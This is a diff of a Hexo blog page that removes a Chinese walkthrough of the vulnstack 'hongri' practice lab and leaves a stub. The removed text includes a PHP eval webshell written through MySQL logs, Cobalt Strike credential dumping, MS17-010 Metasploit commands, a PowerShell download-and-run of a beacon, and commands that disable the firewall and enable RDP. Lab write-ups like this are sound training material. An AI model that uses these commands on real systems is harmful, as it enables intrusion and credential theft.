@@ -182,7 +182,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-06-09 23:00:00 / Modified: 22:59:53" itemprop="dateCreated datePublished" datetime="2023-06-09T23:00:00+08:00">2023-06-09</time>
+              <time title="Created: 2023-06-09 23:00:00 / Modified: 23:01:20" itemprop="dateCreated datePublished" datetime="2023-06-09T23:00:00+08:00">2023-06-09</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -205,141 +205,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>基本上都是看wp的。</p>
-<hr>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>靶场地址：<a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p>
-<ul>
-<li><p>攻击机Kali：</p>
-<p>Nat网卡，192.168.190.130</p>
-</li>
-<li><p>win7</p>
-<p>Nat网卡 192.168.190.136</p>
-<p>手动添加的Vmnet2网卡：192.168.52.128</p>
-</li>
-<li><p>winserver 2008</p>
-<p>Vmnet2网卡：192.168.52.138</p>
-</li>
-<li><p>win2003 Metasploitable</p>
-<p>Vmnet2网卡：192.168.52.141</p>
-</li>
-</ul>
-<p>win7 phpstudy无法运行，手动启动apache 和 mysql</p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43871179/article/details/125307581">https://blog.csdn.net/qq_43871179/article/details/125307581</a></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">httpd.exe -k install</span><br><span class="line"> </span><br><span class="line">httpd.exe -k -n apache2.4</span><br><span class="line"> </span><br><span class="line">mysqld --defaults-file=&quot;C:/phpStudy/mysql/my.ini&quot;</span><br></pre></td></tr></table></figure>
-
-<h1 id="扫描"><a href="#扫描" class="headerlink" title="扫描"></a>扫描</h1><p>Nmap扫：</p>
-<p><img src="image-20230606134320262.png" alt="image-20230606134320262.png"></p>
-<p><img src="image-20230606134553365.png" alt="image-20230606134553365.png"></p>
-<p>beifen.rar里是yxcms的源码</p>
-<p><img src="image-20230606134837688.png" alt="image-20230606134837688.png"></p>
-<p>先看看yxcms，存在目录遍历。</p>
-<p><img src="image-20230606135345236.png" alt="image-20230606135345236.png"></p>
-<h1 id="phpmyadmin弱口令"><a href="#phpmyadmin弱口令" class="headerlink" title="phpmyadmin弱口令"></a>phpmyadmin弱口令</h1><p>phpmyadmin存在弱口令：root root</p>
-<p>（弱口令一开始试的admin admin，没多试几个，跑去审了一个小时的源码，还审不出…..）</p>
-<p><img src="image-20230606135259438.png" alt="image-20230606135259438.png"><br>查看是否可写文件：</p>
-<p><img src="image-20230606140914118.png" alt="image-20230606140914118.png"></p>
-<h1 id="mysql日志写shell"><a href="#mysql日志写shell" class="headerlink" title="mysql日志写shell"></a>mysql日志写shell</h1><p>查看日志</p>
-<p><img src="image-20230606152259037.png" alt="image-20230606152259037.png"><br>有权限，可以修改日志配置写shell。</p>
-<p><img src="image-20230606175241356.png" alt="image-20230606175241356.png"><br>打开日志</p>
-<p><img src="image-20230606142219425.png" alt="image-20230606142219425.png"><br>之前有一个phpinfo.php，可以得到网站根路径，将日志文件保存到那里</p>
-<p><img src="image-20230606142309769.png" alt="image-20230606142309769.png"><br><img src="image-20230606142406085.png" alt="image-20230606142406085.png"><br>此时执行<code>select &#39;&lt;?php eval($_POST[&quot;c&quot;]); ?&gt;&#39;;</code>,该一句话就会被记录到log.php，访问，成功。</p>
-<p><img src="image-20230606142702593.png" alt="image-20230606142702593.png"><br>居然还是系统权限…..</p>
-<p>蚁剑连接：</p>
-<p><img src="image-20230606143032299.png" alt="image-20230606143032299.png"><br>建立隐藏用户并加入管理员组：</p>
-<p><img src="image-20230606143807780.png" alt="image-20230606143807780.png"><br>此时无法通过cmd的net user查看到该用户，但是还有其他手段可以看。</p>
-<p>准备扫内网，通过蚁剑直接拖一个nmap.zip进去，再拖一个unzip.exe用来解压。我好笨拙哈哈哈哈。</p>
-<p><img src="image-20230606205206887.png" alt="image-20230606205206887.png"><br>可用，但没反应：</p>
-<p><img src="image-20230606205303881.png" alt="image-20230606205303881.png"></p>
-<h1 id="上线CS"><a href="#上线CS" class="headerlink" title="上线CS"></a>上线CS</h1><p>瞄了一眼wp，来试试CS，第一次用。</p>
-<p>设置监听</p>
-<p><img src="image-20230606215051667.png" alt="image-20230606215051667.png"><br>生成payload，选哪个应该都可，我选了那个。</p>
-<p><img src="image-20230606215148489.png" alt="image-20230606215148489.png"><br>Listener填刚刚添加的，然后会生成一个文件，送到靶机上，执行它，CS窗口这里就可以收到，说明靶机上线了。</p>
-<p><img src="image-20230606215309756.png" alt="image-20230606215309756.png"><br>最下面可设置心跳时间：<code>beacon&gt; sleep 5</code></p>
-<p>执行靶机上的shell命令：<code>beacon&gt; shell wahomi</code></p>
-<p>执行logonpasswords，抓到域管理员密码：</p>
-<p><img src="image-20230606222425664.png" alt="image-20230606222425664.png"></p>
-<p>执行hashdump，获取用户hash值。：</p>
-<p><img src="image-20230606222517718.png" alt="image-20230606222517718.png"></p>
-<h1 id="收集域信息"><a href="#收集域信息" class="headerlink" title="收集域信息"></a>收集域信息</h1><p>开始收集域信息。</p>
-<p>先看域名。</p>
-<p><code>ipconfig /all</code></p>
-<p><img src="image-20230607094106898.png" alt="image-20230607094106898.png"><br>看存在多少域。（我这里测试报错）</p>
-<p><img src="image-20230607094425059.png" alt="image-20230607094425059.png"><br>看域控主机名</p>
-<p><img src="image-20230607094345831.png" alt="image-20230607094345831.png"><br>查看其他主机。</p>
-<p><img src="image-20230607094558537.png" alt="image-20230607094558537.png"></p>
-<h1 id="建立隧道"><a href="#建立隧道" class="headerlink" title="建立隧道"></a>建立隧道</h1><p>frp设置socks5代理。</p>
-<p>将frpc上传到靶机，运行。</p>
-<p><img src="image-20230607115603563.png" alt="image-20230607115603563.png"><br>Kali运行frps。然后设置代理：<code>/etc/proxychains4.conf</code></p>
-<p><img src="image-20230607110251525.png" alt="image-20230607110251525.png"><br>用nmap扫描：（加-PE表示只用ICMP发现主机，Nat下的kali如果不加-PE则会扫到全部主机存活。52.1的是物理机windows。）</p>
-<p><img src="image-20230607101817801.png" alt="image-20230607101817801.png"></p>
-<p>fscan 扫：<code>fscan 192.168.52.1/24</code></p>
-<p><img src="image-20230607104322559.png" alt="image-20230607104322559.png"><br>发现MS17-010洞，下面开打。</p>
-<h1 id="MS17-010漏洞利用"><a href="#MS17-010漏洞利用" class="headerlink" title="MS17-010漏洞利用"></a>MS17-010漏洞利用</h1><p>下面CS上线内网机时，跳板机要先关防火墙：</p>
-<p>下面两条任意一个都可。</p>
-<p><code>netsh firewall set opmode mode=disable  </code> </p>
-<p><code>netsh advfirewall set allprofiles state off</code></p>
-<p>自己操作时，一直无法上线，登录到域控也就是192.168.52.138那台机看看，发现ping跳板机都不行，才发现是跳板机防火墙没开….</p>
-<p>在当前会话添加监听</p>
-<p><img src="image-20230607110000009.png" alt="image-20230607110000009.png"><br><img src="image-20230607122441198.png" alt="image-20230607122441198.png"><br>生成payload</p>
-<p><img src="image-20230607110113032.png" alt="image-20230607110113032.png"><br>上传到靶机的网站根目录，之后打其他机子要下载该跳板机的木马，再运行。下面msf利用MS17-010运行该木马。</p>
-<p>要开代理。看wp的开代理方式是：</p>
-<p><code>msf6&gt; setg Proxies socks5:127.0.0.1:6000</code></p>
-<p><code>msf6&gt; setg ReverseAllowProxy true</code></p>
-<p>但我的貌似没这两个选项：</p>
-<p><img src="image-20230607112517175.png" alt="image-20230607112517175.png"><br>换个方式启动即可：<code>proxychains msfconsole</code></p>
-<p>下面开始打：</p>
-<p><code>use auxiliary/admin/smb/ms17_010_command</code></p>
-<p><code>set command &quot;whoami&quot;</code></p>
-<p><code>set rhosts 192.168.52.138</code>  域控的内网ip</p>
-<p><code>run</code></p>
-<p><img src="image-20230607112725465.png" alt="image-20230607112725465.png"><br>可以看到成功了。</p>
-<p>下面让他下载跳板机的木马并运行。</p>
-<p><code>set command &quot;powershell.exe -Command (new-object System.Net.WebClient).DownloadFile(&#39;http://192.168.52.128/yxcms/beacon_x64.exe&#39;,&#39;beacon.exe&#39;);start-process beacon.exe&quot;</code></p>
-<p>成功上线：</p>
-<p><img src="image-20230607122616127.png" alt="image-20230607122616127.png"></p>
-<p>接下来尝试上线最后一台windows2003</p>
-<p>同样还是系统权限。</p>
-<p><img src="image-20230607150808246.png" alt="image-20230607150808246.png"></p>
-<p>尝试下载文件，要用certutil，因为win2003 还没有powershell。但certutil失败（本机windows11可以）。</p>
-<p><code>set command &quot;certutil.exe -urlcache -split -f http://192.168.52.128/yxcms/beacon.exe&quot;</code></p>
-<p><code>set command &quot;certutil.exe -urlcache -split -f http://192.168.52.128/yxcms/beacon.exe beacon.exe&quot;</code></p>
-<p><img src="image-20230607155328608.png" alt="image-20230607155328608.png"></p>
-<h1 id="IPC连接"><a href="#IPC连接" class="headerlink" title="IPC连接"></a>IPC连接</h1><p>用52.138对win2003进行IPC连接，用的域管理员账密，成功连接。</p>
-<p><img src="image-20230607163646064.png" alt="image-20230607163646064.png"></p>
-<p>将32位的木马上传到52.138，再用52.138通过IPC发送到win2003</p>
-<p><code>copy beacon_x86.exe \\192.168.52.141\c$</code> 放在C盘根目录</p>
-<p>用msf借MS17-010去运行，成功上线。</p>
-<p><img src="image-20230607164310381.png" alt="image-20230607164310381.png"></p>
-<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><h2 id="关于防火墙"><a href="#关于防火墙" class="headerlink" title="关于防火墙"></a>关于防火墙</h2><p>防火墙这里一直云里雾里的，趁此机会搞懂。</p>
-<hr>
-<p>windows防火墙开启后，不在入站规则里的连接，都给阻止。</p>
-<p>入站规则可以设置允许连接和禁止连接。</p>
-<p>windows防火墙有三种配置文件，每种配置文件对应一种网络：域网络，公用，专用。防火墙可以设置在哪种网络下开启和不开启。</p>
-<p><img src="image-20230607212311981.png" alt="image-20230607212311981.png"></p>
-<p>入站规则：</p>
-<p><img src="image-20230607212144321.png" alt="image-20230607212144321.png"></p>
-<p>如把3306的允许规则取消：</p>
-<p><img src="image-20230607212435901.png" alt="image-20230607212435901.png"><br><img src="image-20230607212612588.png" alt="image-20230607212612588.png"><br>此时3306不是关闭的，只是不给连接而已，本机可以看到3306依然是Listening。所以端口开启关闭和防火墙给不给连接没有必然联系，之前一直搞混这里。</p>
-<p><img src="image-20230607212750982.png" alt="image-20230607212750982.png"></p>
-<h2 id="cmd设置防火墙规则"><a href="#cmd设置防火墙规则" class="headerlink" title="cmd设置防火墙规则"></a>cmd设置防火墙规则</h2><p>进入netsh的上下文，然后可以查看命令的用法，不会就打问号：</p>
-<p><img src="image-20230607215003649.png" alt="image-20230607215003649.png"><br><img src="image-20230607215017727.png" alt="image-20230607215017727.png"></p>
-<p>所以单独开放3389可以这样写：</p>
-<p><code>netsh advfirewall firewall add rule name=&quot;allow3389&quot; protocol=TCP dir=in localport=3389 action=allow</code></p>
-<p>单独开放端口的好处就是不容易给发现。</p>
-<h2 id="打开3389"><a href="#打开3389" class="headerlink" title="打开3389"></a>打开3389</h2><p>上面是打开防火墙允许连接3389，下面是启动3389的监听。</p>
-<p><code>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</code></p>
-<p><img src="image-20230607202738052.png" alt="image-20230607202738052.png"><br>成功连接。</p>
-<h2 id="psexec登录"><a href="#psexec登录" class="headerlink" title="psexec登录"></a>psexec登录</h2><p>尝试从Win7 登录到域控。</p>
-<p><img src="image-20230609215934174.png" alt="image-20230609215934174.png"><br>左上角View-&gt;Target</p>
-<p><img src="image-20230609215720159.png" alt="image-20230609215720159.png"></p>
-<p>选择一条用户凭证，监听器选上面新建的，session选已经上线的那台机。</p>
-<p><img src="image-20230609220022868.png" alt="image-20230609220022868.png"><br>成功上线。</p>
-<p><img src="image-20230609220236378.png" alt="image-20230609220236378.png"></p>
-<h2 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h2><p>直接在win7上用pth，但失败，不知道什么问题……</p>
-<p><img src="image-20230609225412136.png" alt="image-20230609225412136.png"></p>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/334053.html">https://www.freebuf.com/articles/network/334053.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41832837/article/details/109664477">https://blog.csdn.net/qq_41832837/article/details/109664477</a></p>
-
+          <p>none</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2023/06/09/hongri01/">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
